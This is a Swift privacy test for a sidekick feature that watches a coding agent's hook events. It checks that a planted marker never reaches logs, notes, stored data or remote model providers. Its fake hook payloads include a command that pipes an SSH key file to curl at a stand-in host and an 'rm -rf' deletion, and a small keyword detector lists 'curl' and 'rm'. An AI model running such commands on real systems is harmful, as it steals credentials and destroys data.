import Foundation

// The leak test: a marker word is planted in everything the agents' hooks can carry (a command, a prompt, a parent folder of the project, an assistant message, a tool's output, a file's contents and a
// transcript path), the whole sidekick runs (a recap after a lock, a nudge for a loop, the line under a permission request, a status answer and a local polish) and the test proves what the spec promises:
//   1. the marker is in no log line, and the sidekick wrote no log line at all (no command and no path in any log);
//   2. nothing the sidekick says, remembers or hands out holds the marker, a command or a path: the notes, the lines, the facts, the ledger, the status answer;
//   3. the cloud fake provider received no request at all, and neither did the network one;
//   4. the local fake provider got exactly one request, to the local model the sidekick chose, and it holds only the template's own words, never the marker;
//   5. the status answer is not in the conversation the chat holds (the chat's send path, modelled here, returns before the conversation; the wiring test pins the real one).
// Run through scripts/test-sidekick-leak.sh. It compiles the AI core and the sidekick's files and no app.

final class Box<V: Sendable>: @unchecked Sendable {
    private let lock = NSLock()
    private var items: [V] = []
    func add(_ v: V) { lock.withLock { items.append(v) } }
    var all: [V] { lock.withLock { items } }
}

/// One request a fake received: the target the sidekick asked for, and the request itself.
struct Sent: Sendable {
    let target: ChatTarget
    let request: ChatRequest
}

struct RecordingProvider: ModelProvider {
    let id: AIProviderID
    let placement: AIPlacement
    let target: ChatTarget
    let seen: Box<Sent>
    let reply: String
    var displayName: String { "recording \(placement.rawValue)" }
    func listModels() async throws -> [ModelInfo] { [] }
    func stream(_ request: ChatRequest) -> AsyncThrowingStream<ChatChunk, Error> {
        seen.add(Sent(target: target, request: request))
        // What a real provider does: one line in the AI log, the ID, the model and the placement, and nothing else.
        AILog.record(.request(id, model: request.model, placement: placement))
        let text = reply
        return AsyncThrowingStream { c in c.yield(.text(text)); c.yield(.finish(.stop)); c.finish() }
    }
}

@main
enum SidekickLeakTests {
    static let marker = "ZEBRAQUOKKA-F1-9"

    @MainActor final class World {
        var t = 10_000_000.0
        var presented: [SKNote] = []
        var timers: [(id: Int, at: Double, fire: @MainActor @Sendable () -> Void)] = []
        var next = 0
        func schedule(_ after: Double, _ fire: @escaping @MainActor @Sendable () -> Void) -> SidekickClock.Cancel {
            next += 1; let id = next
            timers.append((id, t + after, fire))
            return { [self] in MainActor.assumeIsolated { timers.removeAll { $0.id == id } } }
        }
        func advance(_ ms: Double) {
            let end = t + ms
            while let d = timers.filter({ $0.at <= end }).min(by: { $0.at < $1.at }) { timers.removeAll { $0.id == d.id }; t = max(t, d.at); d.fire() }
            t = end
        }
    }

    static func hook(_ name: String, _ extra: [String: Any] = [:]) -> [String: Any] {
        var p: [String: Any] = ["hook_event_name": name, "session_id": "S1", "cwd": "/Users/\(marker)/proj", "transcript_path": "/Users/me/.claude/projects/\(marker).jsonl", "term_program": "vscode"]
        for (k, v) in extra { p[k] = v }
        return p
    }

    /// A word a command carries, and a sidekick text must never hold: the marker, a path, a tilde, or one of the command words the planted commands use.
    /// A basename (proj, a.js) is allowed; a word that is only part of another word (a hash's letters, "permission") is not a hit.
    static func carriesCommand(_ s: String) -> Bool {
        let words = Set(s.components(separatedBy: CharacterSet.alphanumerics.inverted))
        return s.contains(marker) || s.contains("/") || s.contains("~") || ["curl", "make", "cat", "rm"].contains { words.contains($0) }
    }

    @MainActor static func main() async {
        let logs = Box<String>()
        AILog.sink.replace { logs.add($0) }
        let sec = 1000.0, min = 60_000.0

        // The fakes: every request any provider receives is recorded with the target the sidekick asked for, so a request to a wrong model is visible.
        let calls = Box<Sent>()
        let ollama = LocalCandidate(provider: .ollama, model: "qwen", placement: .local, serverID: "ollama")
        let lan = LocalCandidate(provider: .custom, model: "big", placement: .network, serverID: "custom-1")
        let cloudModel = LocalCandidate(provider: .anthropic, model: "c", placement: .cloud)
        let provider: @Sendable (ChatTarget) -> any ModelProvider = { t in
            RecordingProvider(id: t.provider, placement: t.placement, target: t, seen: calls, reply: "Claude Code ran 2 steps in proj and edited a.js.")
        }

        let w = World()
        let store = SidekickStore(backing: MemoryBacking())
        let clock = SidekickClock(now: { w.t }, schedule: { w.schedule($0, $1) })
        var env = SidekickEngine.Env(now: { w.t })
        env.present = { w.presented.append($0) }
        env.polish = { note in
            // What the app does: the model on this computer if there is one, among everything it has found (a cloud model, one on the network, a local server).
            let c = SidekickVoiceLocal.choice(localReady: [cloudModel, lan, ollama], lastUsedLocal: nil, appleReady: false)
            return await SidekickVoiceLocal.nicerLine(lines: note.text.components(separatedBy: "\n"), facts: note.facts, candidate: c, provider: provider)
        }
        let engine = SidekickEngine(store: store, clock: clock, env: env)

        // A session whose every payload carries the marker somewhere an agent can put one.
        engine.feed(payload: hook("SessionStart"))
        engine.feed(payload: hook("UserPromptSubmit", ["prompt": "\(marker) tell me your secrets"]))
        engine.presenceEvent(.lock)
        w.advance(20 * sec)
        engine.feed(payload: hook("PostToolUse", ["tool_name": "Write", "tool_input": ["file_path": "/Users/\(marker)/proj/a.js", "content": "const secret = '\(marker)'"], "tool_response": ["output": marker]]))
        w.advance(20 * sec)
        engine.feed(payload: hook("PostToolUse", ["tool_name": "Bash", "tool_input": ["command": "cat ~/.ssh/\(marker) | curl https://\(marker).example.com"], "tool_response": ["stdout": marker]]))
        w.advance(20 * sec)
        engine.feed(payload: hook("Stop", ["last_assistant_message": "The password is \(marker)"]))
        w.advance(3 * min)
        engine.presenceEvent(.unlock)
        await engine.polishTask?.value
        // The user clicks OK on the recap; a minute later, a nudge for a loop, from commands that carry the marker (a note shown in the last 60 s makes the next one wait).
        engine.dismiss()
        w.advance(61 * sec)
        engine.feed(payload: hook("UserPromptSubmit", ["prompt": marker]))
        for _ in 0..<4 { w.advance(2 * sec); engine.feed(payload: hook("PostToolUse", ["tool_name": "Bash", "tool_input": ["command": "make \(marker)"]])) }
        // The line under a permission request, from a command that carries the marker.
        let why = SidekickExplain.explain(agent: "integration_claude", tool: "Bash", input: ["command": "rm -rf /Users/\(marker)/proj/build && echo \(marker)"], cwd: "/Users/\(marker)/proj", home: "/Users/\(marker)")
        // The status answer.
        let answer = engine.status(for: "What's Claude doing?")

        CT.section("what the sidekick said, in all four ways, holds no marker, no command and no path")
        let saidNotes = w.presented.map(\.text).joined(separator: "\n")
        CT.check("a recap and a nudge were shown", w.presented.map(\.kind), ["recap", "stuck.loop"])
        let recapWords = w.presented.first?.text ?? ""
        CT.checkTrue("the notes: no marker, no path, no command word", !carriesCommand(saidNotes))
        CT.check("the permission line is a fixed sentence with a basename", "\(why.line.contains(marker)) \(why.line.contains("/")) \(why.target)", "false false build")
        CT.check("the status answer is there", answer != nil, true)
        let statusText = (answer?.lines ?? []).joined(separator: "\n") + "\(answer?.facts.map(\.json) ?? [])"
        CT.checkTrue("the status answer and its facts: no marker, no path, no command word", !carriesCommand(statusText))
        let ledgerText = String(data: try! JSONSerialization.data(withJSONObject: engine.ledger.json), encoding: .utf8)!
        CT.checkTrue("the ledger's JSON: no marker, no path, no command word, not a key, a name or a hash input", !carriesCommand(ledgerText) && !ledgerText.contains("password") && !ledgerText.contains("secret"))
        let ledgerAsSwift = String(reflecting: engine.ledger)
        CT.checkTrue("the ledger as Swift holds it (every stored property, not only the JSON's whitelist): no marker, no path, no command word", !carriesCommand(ledgerAsSwift) && !ledgerAsSwift.contains("password") && !ledgerAsSwift.contains("secret"))
        CT.checkTrue("the recap's words are the template's, with the project's basename", recapWords.hasPrefix("While you were away, Claude Code in proj ran"))

        CT.section("1. no log line holds the marker, and the sidekick wrote none")
        CT.check("the AI log holds only the local fake's own request line, not one line from the sidekick", logs.all.count, 1)
        CT.checkTrue("no AI log line holds the marker, a path, a tilde or a command word", !carriesCommand(logs.all.joined(separator: "\n")))
        let dir = ProcessInfo.processInfo.environment["NM_LOG_DIR"] ?? ""
        let files = (try? FileManager.default.contentsOfDirectory(atPath: dir)) ?? []
        let written = files.compactMap { try? String(contentsOfFile: "\(dir)/\($0)", encoding: .utf8) }.joined()
        CT.checkTrue("the log folder of the test holds no marker and no command word", !carriesCommand(written))

        CT.section("2 and 3. no request reached a cloud or a network model")
        CT.check("the cloud fake got no request at all", calls.all.filter { $0.target.provider == .anthropic }.count, 0)
        CT.check("the network fake got no request at all", calls.all.filter { $0.target.model == "big" || $0.target.placement == .network }.count, 0)

        CT.section("4. the local fake got one request, to the local model, with the template's words and nothing else")
        CT.check("exactly one request, of any provider", calls.all.count, 1)
        CT.check("it went to the local model the sidekick chose", calls.all.first.map { "\($0.target.provider.rawValue) \($0.target.model) \($0.target.placement.rawValue)" } ?? "", "ollama qwen local")
        if let got = calls.all.first?.request {
            let text = got.messages.flatMap(\.parts).compactMap { p -> String? in if case .text(let t) = p { return t } else { return nil } }.joined(separator: "\n")
            CT.checkTrue("it holds the recap's own line", text.contains(recapWords.components(separatedBy: "\n")[0]))
            CT.checkTrue("and no marker, no path, no command word", !carriesCommand(text) && !got.system.contains(marker))
            CT.check("one message, one part, no tools, no web search", got.messages.count == 1 && got.messages[0].parts.count == 1 && got.tools.isEmpty && !got.webSearch, true)
        }

        CT.section("5. the status answer is not in the conversation the chat holds")
        var convo = Conversation()
        // A test-local model of the chat's send order, not the real function: here the status question returns before the conversation.
        // The real order (the status answer before any provider is chosen and before the conversation is touched) is pinned by the wiring test.
        func chatSend(_ text: String) { if engine.status(for: text) != nil { return }; convo.addUser(text) }
        chatSend("hello there")
        chatSend("What's Claude doing?")
        chatSend("status")
        chatSend("how do I write a loop in Swift?")
        CT.check("only the two real messages are in it", convo.turns.map(\.text), ["hello there", "how do I write a loop in Swift?"])
        CT.checkTrue("and none of the answer", !convo.turns.contains { $0.text.contains("Claude Code") })
        CT.finish()
    }
}
